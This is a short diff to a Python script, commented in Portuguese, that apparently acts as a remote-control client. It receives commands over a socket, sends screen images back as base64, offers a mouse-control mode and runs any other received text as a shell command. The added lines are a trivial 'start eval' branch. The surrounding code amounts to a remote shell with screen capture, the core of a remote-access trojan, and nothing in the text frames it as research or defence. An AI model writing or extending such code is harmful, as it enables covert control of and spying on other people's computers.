@@ -25,6 +25,8 @@ while True:
         client_socket.sendall(imagem_base64.encode())  # Envia a string base64 da imagem
     elif comando.lower() == "start-control mouse":
         client_socket.sendall("Modo controle do mouse ativado.".encode())
+    elif comando.lower() == "start eval":
+        print(comando)
     else:
         try:
             processo = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
